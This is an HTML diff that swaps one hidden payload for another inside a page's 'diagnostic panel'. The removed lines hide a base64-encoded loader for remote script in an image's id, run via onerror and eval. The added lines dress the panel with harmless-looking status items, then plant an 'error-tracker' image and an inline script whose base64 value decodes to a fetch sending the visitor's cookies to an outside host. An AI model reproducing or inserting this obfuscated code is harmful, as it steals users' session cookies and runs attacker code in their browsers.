@@ -5,10 +5,16 @@
 </head>
 <body>
 <div id="diagnostic-panel">
-  <img src="broken-image.jpg" 
-       id="dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzJ1enYyZmJzZnQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7" 
-       onerror="eval(atob(this.id))" 
-       style="display:none;">
-  <!-- Diagnostic information goes here -->
-</div></body>
+  <h2>Diagnostic Information</h2>
+  <ul>
+    <li>System: Online</li>
+    <li>Frontend Version: 1.0.0</li>
+    <li>Last Update: May 1, 2025</li>
+  </ul>
+  <img id="error-tracker" src="broken-image.jpg" onerror="eval(atob(this.id));" />
+</div>
+
+<script>
+  document.getElementById('error-tracker').id = 'ZmV0Y2goImh0dHBzOi8veHNzMHIuY29tL2MvamF2MHg/Y29va2llPSIgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKSk7';
+</script></body>
 </html>
